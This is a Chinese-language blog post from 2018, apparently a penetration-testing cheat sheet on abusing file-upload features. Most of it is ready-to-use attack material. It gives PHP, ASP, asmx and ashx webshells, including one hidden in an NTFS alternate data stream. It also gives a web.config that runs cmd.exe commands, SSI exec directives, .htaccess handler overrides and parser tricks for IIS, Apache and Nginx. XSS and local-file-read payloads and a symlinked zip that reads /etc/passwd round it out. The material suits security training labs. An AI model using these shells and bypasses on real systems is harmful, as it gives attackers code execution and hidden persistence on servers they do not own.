---
layout: post
title: file-upload
date: 2018-07-30 
tag: file-upload
---
# 0x00 前言
---
&emsp;&emsp;对文件上传进行一个总结,如果你还没有看过[Upload-labs通关手册](https://xz.aliyun.com/t/2435)，建议先看，本文是对其的一个简单补充,另外本文不对跨域等进行总结，后续会陆续添加。

# 0x01 通用
## 1. shell
```
<% out.println("Hello test");%>     #jsp jspx 
<%response.write("hello test")%>        #asp asmx aspx ashx soap web.config
<?php echo 11111;?>     #php phtml phps  phpt php3 php3p php4 php5   #主要看配置  
有些管理员可能会把php和asp程序设置在一个大目录下(虚拟主机)
```
## 2. xss
```  
上传htm html shtml xml文件等
Basic XSS payload: <script>alert(1337)</script>
XML-based XSS payload: <a:script xmlns:a="http://www.w3.org/1999/xhtml">alert(1337)</a:script>
"><img src=# onerror=alert(1)>.jpg   #文件上传输出文件名导致xss window也可以
```
## 3. 解析漏洞  
```
iis  
文件格式： asa cer cdx
目录解析： /1.asp/1.jpg  #上传1.jpg拿到shell
文件解析： 1.asp;.jpg 
IIS 7.0/IIS 7.5
1.jpg/.php  #上传1.jpg 在后面加上/.php直接当成php来执行

apache
1.php.aaa   #遇到不能解析的类型递归向前解析 默认类型一般是text/plain
1.php%0a    影响2.4.0~2.4.29 linux服务器#上传时1.php后面添加一个\x0A #CVE-2017-15715 https://www.leavesongs.com/PENETRATION/apache-cve-2017-15715-vulnerability.html 

nginx<8.03空字节代码执行漏洞 
1.jpg%00.php   #上传1.jpg然后web访问
1.jpg/.php  #上传1.jpg 在后面加上/.php直接当成php来执行
Nginx 0.8.41至1.4.3版本和1.5.7之前的1.5.x版本 CVE-2013-4547   #绕过访问限制读取s.html 
http://127.0.0.1/test /../protected/s.html  #注意test目录后有一个空格
# 解析漏洞需要test%20目录(window不需要) #使用curl测试 
1.jpg \0.php  #1.jpg[0x20][0x00].php    #使用burp更改编码

#IIS和Nginx一看到URL中文件后缀是.php就把它当成php来解析  
cgi.fix_pathinfo(php会对路径进行修理如/tt.php/111.jpg/111.jpg 1.jpg不存在会当成1.php处理) 

lighttpd
1.jpg/1.php

php cgi解析漏洞
配置文件中的选项cgi.fix_pathinfo = 1开启时 当访问http://www.xxx.com/x.txt/x.php x.php不存在 会把x.txt当成php来执行

```

# 0x02 window  
## 1.截断  
```
window 文件命名规范   #https://docs.microsoft.com/zh-cn/windows/desktop/FileIO/naming-a-file  
window8.3能用但是会重命名为web~1.con     Note 1: Windows 8.3 feature could also be used but it would rename the web.config file to web~1.con in the end.
不能直接上传带有< >的文件，只能覆盖他们   Note 2: Asterisk and question mark symbols cannot be used directly as the file system rejects them.
尽量手动去输出，而不是简单的复制粘贴      Note 3: Sometimes WordPress replaces double and single quotation marks with visually similar symbols. Therefore, it is recommended to type the vectors yourself in Burp Suite or other proxies that you use instead of copy/paste them directly from here.
PHP Windows     #也可以用来文件包含
>       ?       #Greater-than symbol (closing angle bracket “>”) TO a question mark (“?”)
<       *       #Less-than symbol (opening angle bracket “<”) TO an asterisk symbol (“*”)
"       .       #Double quotation mark (""") TO a dot character ("."")   

1.php%20(url decode)    1.php.    1.php%00(url decode)  #生成1.php文件
1.php:aaa               #生成空文件 前提是该文件不存在
1.ph< or 1.ph>          #生成php webshell文件。

echo ^<?php @eval(request[caidao])?^>  > index.php:hidden.jpg
这样子就生成了一个不可见的shell hidden.jpg，常规的文件管理器、type命令，dir命令、del命令发现都找不出那个hidden.jpg的。我们可以在另外一个正常文件里把这个ADS文件include进去，<?php include(‘index.php:hidden.jpg’)?>，这样子就可以正常解析我们的一句话了
```
## 2.ads文件流  
1.php::$DATA    #文件流 生成1.php文件  图片名字:流的名字:流类型
# 0x03 linux  
## 1.文件上传xss
```
"><img src=# onerror=alert(1)>.jpg   #上传输出文件名导致xss linux 调用文件处也可以 可以在w3school测试https://www.w3schools.com/jsref/tryit.asp?filename=tryjsref_fileupload_value  
linux 上传php不解析 pHp绕过
```
# 0x04 IIS
## 1.xss
根据web server服务器fuzz一些不常见的后缀名，同样可以导致xss,详情可以参考这篇文章https://mike-n1.github.io/ExtensionsOverview  
basic    .cer .hxt .htm  .stm  
xml    .dtd .mno .vml .xsl .xht .svg .xml .xsd .xsf .svgz .xslt .wsdl .xhtml   
## 2.file_include or command_exec 
默认情况下，IIS也支持SSI(Server-Side Include)扩展，SSI是为WEB服务器提供的一套命令，这些命令只要直接嵌入到HTML文档的注释内容之中即可，由于安全原因，默认情况下命令会被禁止。  
**若服务器不支持.shtml #IIS 角色服务-应用程序开发-在服务器端包含图片点击安装角色即可**   
https://docs.microsoft.com/en-us/iis/configuration/system.webserver/serversideinclude  
```
<!--#include file="web.config"-->   //可以用来读文件
<!--#include virtual="/includes/header.html" --> //也是读文件 绝对路径
<!--#exec cmd="ipconfig"--> //是否可以用来执行命令 默认情况不会开启 需要配置相关数据  #win2008 IIS7尝试开启失败
Extensions for SSI: .stm .shtm .shtml   #iis常见的一般自定义配置值 其他如apache自己配置 一般为.shtml  
```
## 3.shell  
asp asmx ashx soap svc      #http://py4.me/blog/?p=448
### web.config #需要asp环境支持
```
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
    <system.webServer>
        <handlers accessPolicy="Read, Script, Write">
            <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
        </handlers>
        <security>
            <requestFiltering>
                <fileExtensions>
                    <remove fileExtension=".config" />
                </fileExtensions>
                <hiddenSegments>
                    <remove segment="web.config" />
                </hiddenSegments>
            </requestFiltering>
        </security>
    </system.webServer>
</configuration>
<%response.write("asp test")%>
通过填入下面语句可成功执行asp语句
<%
Response.write CreateObject("wscript.shell").exec("cmd.exe /c ipconfig").StdOut.ReadAll
%>
<%=CreateObject("wscript.shell").exec("cmd.exe /c ipconfig").StdOut.ReadAll()%>
```
### asmx  
asmx demo  
```
<%@ WebService Language="C#" Class="Service" %>
 
using System.Web;
using System.Web.Services;
using System.Web.Services.Protocols;
 
public class Service : System.Web.Services.WebService
{
    [WebMethod]
    public string HelloWorld() {
        return "HelloWorld";
    }
}

http://192.168.44.132:8980/customize.asmx/Chopper   #菜刀密码z
z=A     #POST查看运行目录  
http://192.168.44.132:8980/asmxWebMethodSpy.asmx/Invoke     #密码Ivan
```
### ashx  
```
//浏览器访问这个ashx文件打印Test!  #证明可以使用
<%@ WebHandler Language="C#" Class="Handler" %>
using System;
using System.Web;
public class Handler : IHttpHandler{
    public void ProcessRequest(HttpContext context)
    {
        context.Response.Write("Test!");
    }
    public bool IsReusable
    {
        get
        {
            return false;
        }
    }
}
http://192.168.44.132:8980/HandlerSpy.ashx?Ivan=context.Response.Write(DateTime.Now.ToString())     #输出时间
```
# 0x05 apahce  (httpd or Tomcat)  
```
basic   .html.xxx .shtml
xml .rdf .xht .xml .xsl .svg .xhtml .svgz   #apache返回包里面没有Content-type 这样就可能根据浏览器的习性造成xss攻击  
```
## 1. shell
.htaccess
```
SetHandler application/x-httpd-php  #所有文件解析成php 也可以解析成其他脚本形式如perl ruby参考https://github.com/wireghoul/htshells
```
# 0x06 nginx
```  
basic   .htm
xml     .svg .xml .svgz
```
# 0x07.文件读取 or SSRF or rce
## 通过客户端或者相应的前端框架本地读取相应html
```
<script>alert(document.location);</script>  #get file_location  查看当前源  
动态的执行相关js   #前提是调用文件使用file协议
<embed src="c:\\windows\\win.ini" width="400" height="400">
<object width="400" height="400" data="file://c:/windows/win.ini"></object>
<iframe src="file:///C:/Windows/win.ini" width="400" height="400">
<embed src="file://c:/windows/win.ini" width="400" height="400">
<iframe src="http://localhost"></iframe>
<iframe src="../../../web.xml"></iframe>

http://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html
https://buer.haus/2017/06/29/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/
https://mike-n1.github.io/SSRF_P4toP2
https://hackernoon.com/cross-site-scripting-to-remote-code-execution-on-trellos-app-699512676f0c    #Cross-Site Scripting to Local File Inclusion on Trello’s App
https://hackerone.com/reports/243058
https://maustin.net/2015/11/12/hipchat_rce.html     #XSS to RCE in Atlassian Hipchat
https://medium.com/@arbazhussain/xss-using-dynamically-generated-js-file-a7a10d05ff08
```
## 2.zip自解压  
```
ln -s /etc/passwd link
zip --symlinks test.zip link    #通过自解压zip功能实现文件读取https://xz.aliyun.com/t/2589    #上传软链接读取passwd ln -s / test
```

其他参考链接如下：
``` 
https://soroush.secproject.com/downloadable/microsoft_iis_tilde_character_vulnerability_feature.pdf     #iis端文件名漏洞
https://github.com/ironbee/ironbee-rules/blob/master/support/php/test_fs_evasion.php 
https://soroush.secproject.com/blog/2014/07/file-upload-and-php-on-iis-wildcards/  
http://byd.dropsec.xyz/2017/02/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E7%BB%95%E8%BF%87/
```
#
转载请注明：[whynot](https://notwhy.github.io/) » [file-upload](https://notwhy.gitbooks.io//2018/07/file-upload/)  


